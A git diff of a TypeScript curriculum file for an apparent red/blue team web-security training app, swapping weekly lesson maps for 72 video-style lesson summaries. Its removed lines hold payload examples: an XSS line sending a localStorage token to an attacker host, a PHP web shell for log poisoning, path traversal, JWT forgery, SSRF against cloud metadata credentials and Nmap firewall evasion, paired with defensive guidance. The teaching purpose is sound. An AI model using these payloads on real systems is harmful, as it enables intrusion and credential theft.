@@ -1,6 +1,6 @@
 import { Week, DayLesson, BossLab } from "../types/curriculum";
 
-// Helper generator creating rich Red/Blue Team content for every lesson across all 12 weeks
+// Helper generator creating 72 unique, distinct Red/Blue Team lesson content entries across all 12 weeks (6 days/week = 72 daily lessons)
 const getComprehensiveLessonContent = (
   weekIndex: number,
   dayIndex: number,
@@ -8,417 +8,481 @@ const getComprehensiveLessonContent = (
   competency: string,
   dayName: string
 ) => {
-  const whatYouAreDoingMap: Record<number, string> = {
-    0: `RED TEAM AUDIT:\nYou are auditing client-side JavaScript execution paths to locate un-sanitized DOM property references, window object assignments, and prototype pollution vectors. You will configure Burp Suite Match/Replace rules, craft custom JS payload strings, execute terminal exploits, and analyze browser state.`,
-    1: `RED TEAM AUDIT:\nYou are acting as a reconnaissance specialist auditing compiled JavaScript bundles, Docker container layers, and Git commit logs to extract hardcoded API keys, database connection strings, and AWS secret credentials.`,
-    2: `RED TEAM AUDIT:\nYou are auditing multi-tenant authorization boundaries. You will configure Burp Suite Repeater to tamper with numeric IDs, UUID parameters, HTTP Parameter Pollution (HPP) keys, and custom headers (X-User-ID) to read unauthorized tenant records.`,
-    3: `RED TEAM AUDIT:\nYou are auditing business logic workflows in payment gateways and transaction checkouts. You will test edge cases like negative/fractional item quantities, out-of-order step execution, and high-velocity race conditions.`,
-    4: `RED TEAM AUDIT:\nYou are auditing session tokens and JSON Web Tokens (JWT). You will forge tokens using 'alg': 'none', crack weak secret keys using Hashcat, and perform JWK/KID header injection attacks.`,
-    5: `RED TEAM AUDIT:\nYou are mapping an enterprise target's external attack surface across thousands of subdomains, virtual hosts, and open ports using Go toolchains (Subfinder, Amass, Naabu, ffuf, httpx).`,
-    6: `RED TEAM AUDIT:\nYou are reverse-engineering REST and GraphQL APIs. You will parse exposed Swagger/OpenAPI specifications, audit for Broken Object Level Authorization (BOLA), and escalate privileges via HTTP method tampering (GET to PUT/POST).`,
-    7: `RED TEAM AUDIT:\nYou are mining un-linked HTTP query parameters and hidden debug flags using Arjun and Param Miner to bypass Web Application Firewalls (WAF) and identify developer backdoors.`,
-    8: `RED TEAM AUDIT:\nYou are authoring professional executive vulnerability disclosure reports. You will structure high-impact submissions for HackerOne/Bugcrowd, calculate precise CVSS v3.1/v4.0 vectors, and write clear remediation steps.`,
-    9: `RED TEAM AUDIT:\nYou are performing network-level port scanning and firewall evasion. You will configure Nmap scan timing, bypass filtering rules using decoy IPs and source port overrides, and fingerprint SSL/TLS cipher suites.`,
-    10: `RED TEAM AUDIT:\nYou are auditing cloud infrastructure security across AWS, GCP, and Azure. You will exploit Server-Side Request Forgery (SSRF) vulnerabilities to bypass AWS IMDSv2 metadata protection and exfiltrate cloud service tokens.`,
-    11: `RED TEAM AUDIT:\nYou are executing multi-vulnerability exploit chains. You will combine path traversal file upload bugs with Local File Inclusion (LFI) and SSRF to achieve complete Remote Code Execution (RCE).`
-  };
+  const globalLessonIndex = weekIndex * 6 + dayIndex;
 
-  const vulnerabilityOriginMap: Record<number, string> = {
-    0: `ORIGIN & ROOT CAUSE:\nModern front-end frameworks parse URL parameters and global objects dynamically. When developers use 'Object.assign()' or set 'element.innerHTML' without sanitization, attackers can inject property names like '__proto__.isAdmin' or clobber global DOM properties ('window.config').`,
-    1: `ORIGIN & ROOT CAUSE:\nDuring rapid development sprints, software engineers hardcode API keys and environment variables directly in client source files for testing. When code is compiled using Webpack or pushed to Git repositories, these static credentials remain buried inside client bundles and historical commits.`,
-    2: `ORIGIN & ROOT CAUSE:\nInsecure Direct Object References (IDOR) arise when application endpoints trust user-supplied parameters (like '?user_id=102') without verifying on the server that the logged-in user session actually owns that resource.`,
-    3: `ORIGIN & ROOT CAUSE:\nBusiness logic flaws occur when developers assume users will only follow the intended UI button clicks. They fail to enforce server-side validation checks on numeric bounds (allowing negative cart items) or step dependencies.`,
-    4: `ORIGIN & ROOT CAUSE:\nJWT vulnerabilities stem from weak server-side verification libraries. Accepting the 'none' algorithm header, using weak HMAC secrets, or trusting un-verified 'jwk'/'kid' header parameters allows attackers to manipulate user claims.`,
-    5: `ORIGIN & ROOT CAUSE:\nLarge enterprises deploy hundreds of microservices across cloud providers. Forgotten staging environments ('staging-api.corp.com') and legacy virtual hosts often run un-patched code without centralized security monitoring.`,
-    6: `ORIGIN & ROOT CAUSE:\nREST and GraphQL APIs decouple front-end UI from backend data stores. Developers frequently implement authorization checks at the UI layer rather than at the database object level, causing Broken Object Level Authorization (BOLA).`,
-    7: `ORIGIN & ROOT CAUSE:\nDevelopers add hidden query parameters (like '?debug=true' or '?admin_bypass=1') to diagnose production bugs. These parameters remain active in production code without being documented in public API specs.`,
-    8: `ORIGIN & ROOT CAUSE:\nIneffective vulnerability disclosure reports lack step-by-step reproduction steps, cURL commands, or impact metrics, leading to report rejection or lower bounty payouts on bug bounty platforms.`,
-    9: `ORIGIN & ROOT CAUSE:\nMisconfigured network firewalls and permissive security groups allow external access to internal administrative services (such as Redis, Memcached, or SSH) on un-monitored secondary ports.`,
-    10: `ORIGIN & ROOT CAUSE:\nServer-Side Request Forgery (SSRF) occurs when a web server fetches external URLs supplied by users without restricting access to loopback IP ranges (\`127.0.0.1\` or AWS IMDS metadata \`169.254.169.254\`).`,
-    11: `ORIGIN & ROOT CAUSE:\nExploit chains arise when multiple low-severity issues (a file path traversal + un-sanitized template engine) interact, allowing an attacker to move from simple file reading to full Remote Code Execution (RCE).`
-  };
+  // 72 Unique Expert Video Methodology Breakdowns (Inspired by Haddix, Bombal, NahamSec, LiveOverflow, IppSec, John Hammond)
+  const videoBreakdowns: { title: string; duration: string; methodologySummary: string }[] = [
+    // Week 1: Client-Side JS Deconstruction
+    {
+      title: "Mastering Client-Side DOM Inspection & Window Object Clobbering",
+      duration: "18 Mins",
+      methodologySummary: "In this session, learn how senior researchers analyze browser runtime memory state. Trace un-sanitized DOM assignments, inspect document.referrer and window.name variables, and clobber HTML elements to redirect script execution paths."
+    },
+    {
+      title: "Deconstructing Client-Side Prototype Pollution Sinks",
+      duration: "22 Mins",
+      methodologySummary: "Analyze real-world prototype pollution vulnerabilities in modern front-end bundles. Learn how recursive object merge functions parse __proto__ properties and override global application flags."
+    },
+    {
+      title: "Source Map Reconstruction & Obfuscated JS Unpacking",
+      duration: "25 Mins",
+      methodologySummary: "Examine tactics for extracting original production source code from .map files and Webpack bundles. Use CLI toolchains to deobfuscate minified client code and discover un-redacted API endpoints."
+    },
+    {
+      title: "LocalStorage & SessionStorage XSS Exfiltration Vectors",
+      duration: "16 Mins",
+      methodologySummary: "Explore how persistent client storage stores session tokens, bearer authorization headers, and user PII. Build stealthy exfiltration payloads that read window.localStorage without triggering standard browser security alarms."
+    },
+    {
+      title: "Auditing WebSockets: Interception & Message Replay Attacks",
+      duration: "20 Mins",
+      methodologySummary: "Inspect full-duplex WebSocket frames using proxy tools. Learn to identify missing origin verification during handshakes, craft custom WS frame payloads, and execute cross-site WebSocket hijacking (CSWSH)."
+    },
+    {
+      title: "CORS Misconfigurations: Origin Reflection & Wildcard Bypasses",
+      duration: "19 Mins",
+      methodologySummary: "Audit Access-Control-Allow-Origin response headers. Test for arbitrary origin reflection, null origin trust, and sub-domain wildcard bypasses to steal cross-origin authenticated session responses."
+    },
 
-  const pentesterFocusMap: Record<number, string> = {
-    0: `PENTESTER FOCUS & WHAT TO LOOK FOR:\n1. Search JS source bundles for dangerous sinks: 'innerHTML', 'document.write', 'eval()', 'Object.assign()', and 'merge()'.\n2. Test parameter inputs with prototype pollution payloads: '?__proto__[isAdmin]=true' or '?constructor.prototype.status=active'.\n3. Check if global window variables (e.g. 'window.config.apiEndpoint') can be overridden using clobbered HTML tags ('<a id="config" href="...">').`,
-    1: `PENTESTER FOCUS & WHAT TO LOOK FOR:\n1. Search JS files using regex patterns for credentials: AWS ('AKIA[0-9A-Z]{16}'), GCP ('AIza[0-9A-Za-z-_]{35}'), and Firebase URLs.\n2. Clone public GitHub repositories and inspect commit history using 'git log -p' or TruffleHog.\n3. Decompile Android APK bundles and extract credentials from 'strings.xml' or env configurations.`,
-    2: `PENTESTER FOCUS & WHAT TO LOOK FOR:\n1. Identify all requests containing object IDs: '/api/v1/orders/1001' or 'X-User-ID: 55'.\n2. Swap user IDs with secondary test account numbers to check for missing access control.\n3. Test HTTP Parameter Pollution (HPP) by appending duplicate keys: '?id=101&id=102'.`,
-    3: `PENTESTER FOCUS & WHAT TO LOOK FOR:\n1. Test negative numbers (-1) and fractional values (0.001) in cart quantities, prices, and transfer amounts.\n2. Send 50+ concurrent identical requests using Burp Turbo Intruder to test for race conditions on discount codes.\n3. Skip intermediate workflow steps (e.g. going straight from Step 1 to Step 4 in checkout).`,
-    4: `PENTESTER FOCUS & WHAT TO LOOK FOR:\n1. Decode JWT tokens using jwt.io or Burp JWT Editor extension.\n2. Change 'alg' header to 'none' and remove the signature block.\n3. Brute-force HMAC secret keys using Hashcat with rockyou.txt wordlists.\n4. Inject self-signed public keys in the 'jwk' header parameter.`,
-    5: `PENTESTER FOCUS & WHAT TO LOOK FOR:\n1. Run 'subfinder -d target.com -all' and 'amass enum -d target.com' to discover subdomains.\n2. Resolve IP records and perform port scans using Naabu and Rustscan.\n3. Probe for hidden virtual hosts using 'ffuf -u http://target.com -H "Host: FUZZ.target.com"'.`,
-    6: `PENTESTER FOCUS & WHAT TO LOOK FOR:\n1. Append '/swagger.json', '/v2/api-docs', or '/graphql' to find undocumented API schemas.\n2. Test Broken Object Level Authorization (BOLA) by changing IDs in GET, PUT, and DELETE API endpoints.\n3. Convert GET requests to PUT/POST requests to test HTTP method tampering.`,
-    7: `PENTESTER FOCUS & WHAT TO LOOK FOR:\n1. Run 'arjun -u https://target.com/api/v1/user -m GET,POST' to mine un-linked parameters.\n2. Test debug query parameters: '?debug=true', '?admin=1', '?testMode=1', or '?env=dev'.\n3. Mine custom cache-control headers: 'X-Forwarded-Host', 'X-Custom-IP-Authorization'.`,
-    8: `PENTESTER FOCUS & WHAT TO LOOK FOR:\n1. Document exact step-by-step reproduction steps with cURL command lines.\n2. Calculate exact CVSS v3.1/v4.0 vector strings (e.g. CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H).\n3. Detail real-world business impact and provide clear developer remediation guidance.`,
-    9: `PENTESTER FOCUS & WHAT TO LOOK FOR:\n1. Run Nmap scans with timing controls: 'nmap -sV -sC -T3 -p- target.com'.\n2. Bypass firewall filtering by spoofing source ports ('--source-port 53') or using decoy IPs ('-D RND:10').\n3. Probe SSL/TLS cryptographic cipher suites using testssl.sh.`,
-    10: `PENTESTER FOCUS & WHAT TO LOOK FOR:\n1. Test URL parameters for SSRF: '?url=http://169.254.169.254/latest/meta-data/'.\n2. Bypass AWS IMDSv2 token headers using Open Redirect vulnerabilities or local header overrides.\n3. Probe for un-authenticated Azure Blob containers and public Google Cloud Function triggers.`,
-    11: `PENTESTER FOCUS & WHAT TO LOOK FOR:\n1. Combine Path Traversal during file upload ('filename="../../shell.php"') with LFI.\n2. Chain SSRF to access internal administrative panels, then trigger dynamic template injection.\n3. Escalate privileges from local read access to Remote Code Execution (RCE).`
-  };
+    // Week 2: Secret Hunting & Reconnaissance
+    {
+      title: "Regex Pattern Matching for Cloud & API Credentials",
+      duration: "21 Mins",
+      methodologySummary: "Build custom regular expressions targeting AWS access keys, Google Cloud API keys, Stripe tokens, and JWT secrets buried deep within client-side JavaScript assets."
+    },
+    {
+      title: "Extracting Hidden Env Credentials from Container Layers",
+      duration: "24 Mins",
+      methodologySummary: "Audit public and private Docker image layer histories. Reconstruct historical image builds using layer extraction tools to reveal leaked environment variables and hardcoded database connection strings."
+    },
+    {
+      title: "Deep GitHub Archive & Commit History Mining",
+      duration: "28 Mins",
+      methodologySummary: "Mine historical Git repositories for leaked secrets. Use git log -p, search deleted branches, and analyze public developer fork pull requests to uncover forgotten corporate secrets."
+    },
+    {
+      title: "Auditing Unauthenticated Firebase & NoSQL Databases",
+      duration: "17 Mins",
+      methodologySummary: "Discover exposed Google Firebase realtime databases and Firestore instances. Test read/write permission rules directly via REST endpoint queries (.json extensions) to leak production user tables."
+    },
+    {
+      title: "Advanced Directory Brute-Forcing & Config File Discovery",
+      duration: "23 Mins",
+      methodologySummary: "Master recursive wordlist fuzzing against web application roots. Uncover backup files (.bak, .old, .swp), environment configurations (.env.production), and un-linked administrative scripts."
+    },
+    {
+      title: "Decompiling Android APKs for Static Credential Analysis",
+      duration: "26 Mins",
+      methodologySummary: "Reverse-engineer Android application packages (APKs) using jadx-gui and apktool. Inspect AndroidManifest.xml, string resources, and compiled Java native binaries for embedded secret tokens."
+    },
 
-  const payloadCraftingMap: Record<number, string> = {
-    0: `PAYLOAD CRAFTING LOGIC:\n1. DOM Clobbering: \`<iframe name="config" srcdoc="<a id='apiEndpoint' href='javascript:alert(1)'></a>"></iframe>\`\n2. Prototype Pollution: \`__proto__[isAdmin]=true\` or \`constructor.prototype.status=active\`\n3. LocalStorage Theft: \`<img src=x onerror="fetch('http://attacker.com/?t='+localStorage.getItem('token'))">\``,
-    1: `PAYLOAD CRAFTING LOGIC:\n1. AWS Key Regex: \`AKIA[0-9A-Z]{16}\`\n2. GCP Key Regex: \`AIza[0-9A-Za-z-_]{35}\`\n3. Git History Search: \`git log -p -S "SECRET_KEY" -S "PASSWORD"\``,
-    2: `PAYLOAD CRAFTING LOGIC:\n1. Header Override: \`X-User-ID: 1002\` or \`X-Forwarded-For: 127.0.0.1\`\n2. HPP Parameter Pollution: \`GET /api/user?id=101&id=102\`\n3. UUID Substitution: Replace client UUID with target victim UUID.`,
-    3: `PAYLOAD CRAFTING LOGIC:\n1. Negative Quantity: \`{"cart_id": 1, "quantity": -5}\`\n2. Price Override: \`{"price": 0.01, "item_id": "laptop_pro"}\`\n3. Workflow Re-ordering: Send Disbursement API request before Verification API request.`,
-    4: `PAYLOAD CRAFTING LOGIC:\n1. JWT None Alg: Change \`{"alg":"HS256"}\` to \`{"alg":"none"}\` and strip signature.\n2. JWK Header Injection: Inject self-signed public key in \`"jwk": {...}\` header parameter.\n3. Hashcat Cracking: \`hashcat -m 16500 jwt.txt rockyou.txt\``,
-    5: `PAYLOAD CRAFTING LOGIC:\n1. Subfinder: \`subfinder -d target.com -all -silent\`\n2. VHost Fuzzing: \`ffuf -u http://target.com -H "Host: FUZZ.target.com" -w wordlist.txt -fs 1234\`\n3. Port Scan: \`naabu -host target.com -p -\``,
-    6: `PAYLOAD CRAFTING LOGIC:\n1. BOLA Query: \`GET /api/v1/documents/target_doc_id\`\n2. Method Tampering: Change \`GET /api/v1/config\` to \`PUT /api/v1/config\` with \`{"role":"admin"}\`\n3. Swagger Specs: Access \`/api-docs\` or \`/swagger/v1/swagger.json\``,
-    7: `PAYLOAD CRAFTING LOGIC:\n1. Arjun Mining: \`arjun -u https://target.com/page -m GET,POST\`\n2. Debug Flag Injection: \`?debug=true&admin=1&override=true\`\n3. Cache Poisoning Header: \`X-Forwarded-Host: evil-attacker.com\``,
-    8: `PAYLOAD CRAFTING LOGIC:\n1. Report Title: \`[CRITICAL] BOLA on /api/v1/user Leads to Full Account Takeover\`\n2. CVSS Vector: \`CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:N\` (Score 9.1)\n3. PoC cURL: \`curl -X GET "https://target.com/api/v1/user/102" -H "Authorization: Bearer TOKEN"\``,
-    9: `PAYLOAD CRAFTING LOGIC:\n1. Nmap Scan: \`nmap -sV -sC -T3 -p- target.com\`\n2. Firewall Decoy: \`nmap -sS -D RND:10 --source-port 53 target.com\`\n3. Banner Grab: \`nc -nv target.com 8080\``,
-    10: `PAYLOAD CRAFTING LOGIC:\n1. AWS IMDSv1 Query: \`http://169.254.169.254/latest/meta-data/iam/security-credentials/\`\n2. IMDSv2 Token Bypass: Fetch token via PUT request, then send token in \`X-aws-ec2-metadata-token\` header.\n3. S3 Bucket Audit: \`aws s3 ls s3://target-bucket-name --no-sign-request\``,
-    11: `PAYLOAD CRAFTING LOGIC:\n1. Path Traversal Upload: \`filename="../../../etc/passwd"\`\n2. LFI Payload: \`GET /index.php?page=../../../../var/log/apache2/access.log\`\n3. RCE Execution: Inject PHP payload \`<?php system($_GET['cmd']); ?>\` into access logs.`
-  };
+    // Week 3: Advanced Insecure Direct Object References (IDOR)
+    {
+      title: "IDOR Auditing via Custom Header Manipulations",
+      duration: "20 Mins",
+      methodologySummary: "Audit multi-tenant API gateways that rely on custom headers like X-User-ID, X-Account-Id, or X-Forwarded-User. Intercept and mutate these headers in proxy tools to access victim tenant data."
+    },
+    {
+      title: "Numeric ID Brute-Forcing & Secondary IDOR Validation",
+      duration: "18 Mins",
+      methodologySummary: "Identify sequential integer IDs in REST API routes. Test secondary access controls across GET, PUT, and DELETE HTTP verbs to execute unauthorized profile updates and private record deletion."
+    },
+    {
+      title: "UUID vs Sequential Identifier Enumeration Strategies",
+      duration: "22 Mins",
+      methodologySummary: "Bypass non-sequential UUID parameters by discovering secondary endpoints (such as export logs, public profile reviews, or search suggestion endpoints) that leak target UUID strings."
+    },
+    {
+      title: "Bypassing IDOR Authorization Checks via Parameter Pollution (HPP)",
+      duration: "24 Mins",
+      methodologySummary: "Supply duplicate parameters in HTTP query strings (e.g. ?id=user_a&id=user_b) to test how WAFs and backend web frameworks handle array parameters, successfully bypassing authorization filters."
+    },
+    {
+      title: "IDOR on Object Deletion & Critical State Changes",
+      duration: "19 Mins",
+      methodologySummary: "Target critical administrative endpoints handling account deletion, billing method updates, and team member removals. Verify missing server-side ownership authorization on state-changing POST/DELETE calls."
+    },
+    {
+      title: "GraphQL IDORs via Query Introspection & Custom Variables",
+      duration: "27 Mins",
+      methodologySummary: "Inspect GraphQL endpoints using schema introspection. Query hidden user node fields, manipulate GraphQL query variables, and execute unauthorized mutation operations across tenant boundaries."
+    },
 
-  const burpSuiteSetupMap: Record<number, string> = {
-    0: `BURP SUITE SETUP & PROXY CONFIGURATION:\n1. Proxy -> Intercept: Enable Intercept to capture outbound client JS calls.\n2. Match and Replace Rules: Add rule in Proxy Options to automatically inject \`__proto__[isAdmin]=true\` into JSON request bodies.\n3. Extensions: Install 'DOM Invader' extension from BApp Store to automatically detect DOM clobbering sinks in real-time.`,
-    1: `BURP SUITE SETUP & PROXY CONFIGURATION:\n1. Burp Search: Use Ctrl+F in Target -> Site Map to search for regex strings (\`AKIA\`, \`AIza\`, \`secret\`).\n2. Extensions: Install 'Secret Finder' and 'JSMiner' from BApp Store to passively parse all loaded JS files for credentials.\n3. Logger++: Set up Logger++ filters to highlight HTTP responses containing secret keys in bright green.`,
-    2: `BURP SUITE SETUP & PROXY CONFIGURATION:\n1. Repeater: Send target requests to Repeater (Ctrl+R) to test ID parameter variations.\n2. Intruder: Set payload marker on user ID parameter (\`/user/\`§101§\`) and run Bumber/Sequential scan.\n3. Extensions: Install 'Autorize' from BApp Store to automatically test access controls using low-privileged session tokens.`,
-    3: `BURP SUITE SETUP & PROXY CONFIGURATION:\n1. Repeater: Intercept checkout requests and modify quantity values to negative integers.\n2. Turbo Intruder: Use Turbo Intruder Python script to send 100 concurrent requests in parallel for race conditions.\n3. Match/Replace: Automatically replace coupon codes or pricing flags in outbound HTTP POST bodies.`,
-    4: `BURP SUITE SETUP & PROXY CONFIGURATION:\n1. Extensions: Install 'JWT Editor' from BApp Store.\n2. Repeater JWT Tab: Right-click token in Repeater -> JWT Tab -> Select 'Switch Algorithm to None' or 'Inject JWK Header'.\n3. Match/Replace: Automatically replace Authorization headers with self-signed admin JWT tokens.`,
-    5: `BURP SUITE SETUP & PROXY CONFIGURATION:\n1. Scope: Define Target Scope (\`*.target.com\`) under Target -> Scope Settings.\n2. Passive Scanning: Enable passive proxy listening while browsing target web assets.\n3. Extensions: Install 'Param Miner' and 'Flow' from BApp Store to discover un-linked endpoints.`,
-    6: `BURP SUITE SETUP & PROXY CONFIGURATION:\n1. Extensions: Install 'OpenAPI Parser' and 'GraphQL Raider' from BApp Store.\n2. OpenAPI Parser: Import \`/swagger.json\` URL to automatically populate Repeater with every API endpoint.\n3. Repeater: Test changing GET requests to PUT/POST requests with custom JSON bodies.`,
-    7: `BURP SUITE SETUP & PROXY CONFIGURATION:\n1. Extensions: Install 'Param Miner' from BApp Store.\n2. Param Miner Action: Right-click target request -> Extensions -> Param Miner -> 'Guess headers' or 'Guess params'.\n3. Logger++: Monitor background HTTP requests for status code differences indicating matted parameters.`,
-    8: `BURP SUITE SETUP & PROXY CONFIGURATION:\n1. Copy as cURL: Right-click verified exploit request in Repeater -> 'Copy as cURL'.\n2. Organizer: Save verified exploit requests in Burp Organizer with notes for report drafting.\n3. Engagement Tools: Use Burp 'Generate CSRF PoC' or export HTTP request/response text files.`,
-    9: `BURP SUITE SETUP & PROXY CONFIGURATION:\n1. Upstream Proxy: Set up Upstream Proxy servers in Burp Settings if testing through external SOCKS5 VPNs.\n2. Extensions: Install 'IP Rotate' from BApp Store to distribute outbound requests across AWS API Gateways.\n3. Project Options: Configure custom TLS/SSL ciphers and protocols.`,
-    10: `BURP SUITE SETUP & PROXY CONFIGURATION:\n1. Collaborator: Use Burp Collaborator Client to generate unique OAST domain payloads (\`http://xxx.burpcollaborator.net\`).\n2. Repeater: Inject Collaborator URL into URL parameters to test for out-of-band SSRF.\n3. Extensions: Install 'SSRF King' from BApp Store.`,
-    11: `BURP SUITE SETUP & PROXY CONFIGURATION:\n1. Repeater: Intercept file upload POST requests and modify Content-Type and filename parameters.\n2. Match/Replace: Set automatic rules to swap file extension extensions (\`.png\` -> \`.php\`).\n3. Extensions: Install 'Upload Scanner' and 'ActiveScan++' from BApp Store.`
-  };
+    // Week 4: Broken Business Logic Auditing
+    {
+      title: "Exploiting Negative & Fractional Boundary Conditions in E-Commerce",
+      duration: "21 Mins",
+      methodologySummary: "Test numerical inputs in payment processing workflows. Pass negative item quantities, fractional currency units, and extreme integer values (Integer Overflow) to corrupt shopping cart calculations."
+    },
+    {
+      title: "High-Velocity Race Conditions on Promo Codes & Gift Cards",
+      duration: "25 Mins",
+      methodologySummary: "Utilize single-packet HTTP request techniques in proxy tools to execute concurrent requests. Redeem limited-use promotional codes or transfer funds simultaneously across multiple parallel threads."
+    },
+    {
+      title: "Multi-Step Workflow Interception & Out-of-Order Step Execution",
+      duration: "23 Mins",
+      methodologySummary: "Analyze multi-stage application workflows (Registration -> Email Verification -> Payment -> Provisioning). Skip intermediate verification steps by issuing direct HTTP calls to final fulfillment endpoints."
+    },
+    {
+      title: "Manipulating Client-Side Price & Discount Parameters",
+      duration: "18 Mins",
+      methodologySummary: "Identify shopping carts that calculate sub-totals on the client-side or pass price fields directly in POST request bodies. Tamper with price parameters to purchase high-value assets for $0.01."
+    },
+    {
+      title: "Bypassing Rate-Limiting & Lockouts on OTP Verification Endpoints",
+      duration: "22 Mins",
+      methodologySummary: "Audit two-factor authentication (2FA) and password reset OTP endpoints. Bypass rate-limiting using IP header spoofing, array parameter injections, or null byte truncation."
+    },
+    {
+      title: "Role Transition Flipping via Custom Header Overrides",
+      duration: "20 Mins",
+      methodologySummary: "Intercept privilege upgrade workflows. Modify response status codes (HTTP 403 to 200) or override client role flags (role=member to role=admin) in outbound API requests."
+    },
 
-  const blueTeamDefenseMap: Record<number, string> = {
-    0: `BLUE TEAM DEFENSE & SECURE CODING:\n1. Code Prevention: Freeze Object prototypes using 'Object.freeze(Object.prototype)' on application startup.\n2. DOM Sanitization: Use DOMPurify before setting innerHTML ('DOMPurify.sanitize(input)').\n3. Content Security Policy (CSP): Deploy strict CSP headers ('script-src 'self' 'nonce-...'') to block unauthorized inline script execution.`,
-    1: `BLUE TEAM DEFENSE & SECURE CODING:\n1. Secret Management: Store API keys in environment variables or AWS Secrets Manager / HashiCorp Vault. Never hardcode keys in client-side code.\n2. Git Pre-commit Hooks: Use GitGuardian or TruffleHog in CI/CD pipelines to automatically block commits containing AWS/GCP API key patterns.\n3. Key Rotation: Revoke exposed API keys immediately upon detection.`,
-    2: `BLUE TEAM DEFENSE & SECURE CODING:\n1. Server-Side Authorization: Enforce object-level access controls on every API endpoint (\`if (doc.ownerId !== req.user.id) throw Forbidden()\`).\n2. Indirect Mapping: Use unpredictable UUIDv4 identifiers or mapped session tokens rather than sequential integer IDs.\n3. Audit Logging: Log all access control denial events for SIEM monitoring.`,
-    3: `BLUE TEAM DEFENSE & SECURE CODING:\n1. Input Validation: Enforce strict boundary checks on numeric inputs (\`if (quantity <= 0) throw ValidationError()\`).\n2. Mutex Locks: Use Redis distributed locks or database transaction row-level locks (\`SELECT FOR UPDATE\`) to prevent race conditions.\n3. Step Enforcement: Validate session state transition flags on the server before processing disbursements.`,
-    4: `BLUE TEAM DEFENSE & SECURE CODING:\n1. JWT Algorithm Enforcement: Explicitly enforce allowed algorithms on the server (\`jwt.verify(token, secret, { algorithms: ['HS256'] })\`). Never accept 'none'.\n2. Strong Secrets: Use 512-bit randomly generated secret keys for HMAC signing.\n3. JWK Verification: Validate JWK/KID headers against a trusted internal key registry.`,
-    5: `BLUE TEAM DEFENSE & SECURE CODING:\n1. Asset Inventory: Maintain a centralized cloud asset inventory (AWS Config, CloudTrail) to discover un-monitored subdomains.\n2. DNS Hygiene: Remove stale DNS CNAME records to prevent subdomain takeover attacks.\n3. Network Perimeter: Firewall internal staging microservices behind VPNs or zero-trust access gateways (Cloudflare Access).`,
-    6: `BLUE TEAM DEFENSE & SECURE CODING:\n1. Object-Level Access Control: Enforce BOLA authorization checks on every REST and GraphQL query resolver.\n2. Schema Validation: Enforce strict JSON Schema validation on input payloads to prevent Mass Assignment attacks.\n3. Method Restrictions: Explicitly disable unused HTTP methods (PUT, DELETE, PATCH) on public endpoints.`,
-    7: `BLUE TEAM DEFENSE & SECURE CODING:\n1. Remove Debug Flags: Strip all development debug code and test query parameters (\`debug=true\`) before production deployment.\n2. WAF Rules: Deploy Web Application Firewall rules to block un-documented query parameters.\n3. Cache Keys: Include all relevant query parameters and headers in HTTP cache key calculations.`,
-    8: `BLUE TEAM DEFENSE & SECURE CODING:\n1. VDP Policy: Publish clear Vulnerability Disclosure Program policies (security.txt) detailing safe harbor guidelines.\n2. Triage SLA: Establish rapid SLA response times for Critical vulnerability reports (under 24 hours).\n3. Patch Management: Deploy root-cause fixes across all microservices rather than applying superficial hotfixes.`,
-    9: `BLUE TEAM DEFENSE & SECURE CODING:\n1. Firewall Rules: Enforce Default Deny firewall rules on all external network interfaces.\n2. Network Segmentation: Isolate administrative management ports (SSH, Redis, Elastic) inside private VPC subnets.\n3. Intrusion Detection: Deploy Suricata / Snort IDS rules to flag port scan sweeps.`,
-    10: `BLUE TEAM DEFENSE & SECURE CODING:\n1. Require AWS IMDSv2: Enforce IMDSv2 on all EC2 instances (\`http-tokens=required\`) to block SSRF metadata exfiltration.\n2. URL Allowlisting: Restrict server-side HTTP fetchers to explicit allowlists of trusted domain names.\n3. Network Isolation: Block outbound requests to local loopback (\`127.0.0.1\`) and cloud metadata (\`169.254.169.254\`).`,
-    11: `BLUE TEAM DEFENSE & SECURE CODING:\n1. Defense-in-Depth: Enforce strict security controls at every layer (input validation, file type checks, container isolation).\n2. Unprivileged Execution: Run web application containers under unprivileged Linux service accounts (\`nobody\` or non-root).\n3. File System Read-Only: Mount application storage containers as read-only file systems.`
-  };
+    // Week 5: Session Management & JWT Exploitation
+    {
+      title: "JWT None Algorithm Signature Bypass Attacks",
+      duration: "19 Mins",
+      methodologySummary: "Deconstruct JSON Web Tokens (JWT). Change the signature algorithm header from HS256/RS256 to 'none', remove the cryptographic signature block, and achieve complete identity forgery."
+    },
+    {
+      title: "Brute-Forcing Weak JWT HMAC Secret Keys with Hashcat",
+      duration: "24 Mins",
+      methodologySummary: "Extract signed JWT tokens from session cookies. Perform high-speed offline dictionary brute-forcing against HMAC secret keys using Hashcat and custom wordlists to recover the signing secret."
+    },
+    {
+      title: "JWT JWK (JSON Web Key) Header Injection Attacks",
+      duration: "26 Mins",
+      methodologySummary: "Inject self-signed public RSA keys into the 'jwk' parameter of the JWT header. Sign custom administrative tokens using your private key and force the target server to trust the embedded public key."
+    },
+    {
+      title: "Session Fixation & Cross-Subdomain Cookie Injections",
+      duration: "21 Mins",
+      methodologySummary: "Audit session ID regeneration after user authentication. Inject pre-authenticated session cookies across target subdomains to hijack active user account sessions."
+    },
+    {
+      title: "Bypassing SameSite Cookie Protections via CSRF Chain Attacks",
+      duration: "23 Mins",
+      methodologySummary: "Analyze SameSite=Lax and SameSite=Strict cookie attributes. Combine top-level window navigations, GET-based state changes, or client-side redirects to bypass CSRF defenses."
+    },
+    {
+      title: "JWT Key ID (kid) Header Exploitation (SQLi & Path Traversal)",
+      duration: "28 Mins",
+      methodologySummary: "Exploit backend database/file-system lookups triggered by the 'kid' JWT header parameter. Inject path traversal sequences ('../../../../dev/null') or SQL injection strings into the key lookup routine."
+    },
 
-  const tutorialsMap: Record<number, string[]> = {
-    0: [
-      `Step 1: Open the target code inspection box below and locate un-sanitized DOM or variable assignments.`,
-      `Step 2: Identify where user input (query parameters or hash fragments) is passed to dangerous sinks like innerHTML or Object.assign.`,
-      `Step 3: Construct your exploit payload (e.g. __proto__.isAdmin=true or clobbering an iframe ID).`,
-      `Step 4: Execute the payload in the local shell terminal to compromise the sandbox container.`,
-      `Step 5: Copy the captured flag into the verification box and click 'Verify & Complete' to earn XP.`
-    ],
-    1: [
-      `Step 1: Inspect compiled JavaScript bundles or environment files looking for API key signatures.`,
-      `Step 2: Apply regex search patterns matching AWS keys (AKIA...), GCP keys (AIza...), or Firebase databases.`,
-      `Step 3: Enter your credential extraction payload or regex search query in the workspace.`,
-      `Step 4: Run the exploit in the terminal shell to parse leaked secrets and retrieve system flags.`,
